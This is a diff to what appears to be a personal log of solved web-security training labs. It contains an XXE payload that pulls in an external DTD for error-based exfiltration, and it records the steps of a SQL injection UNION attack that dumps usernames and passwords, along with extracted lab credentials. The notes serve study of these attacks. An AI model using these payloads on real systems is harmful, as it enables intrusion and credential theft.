@@ -310,3 +310,11 @@ websocket, dom-xss, cache-poisoning, clickjacking
     - Payload: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "DTD-URL">%xxe;]>
     - Extracted users: peter, carlos, user, elmer, academy
     - Key: Parameter entity nesting for error-based exfiltration
+
+### SQLi (18)
+63. SQL injection UNION attack, retrieving multiple values in single column
+    - 2 columns found via ORDER BY
+    - Column 2 accepts text
+    - Concatenation: username||':'||password FROM users
+    - Extracted: administrator / mg7a101dtki7mj4do3iw
+    - Key: || operator to squeeze multiple columns into one
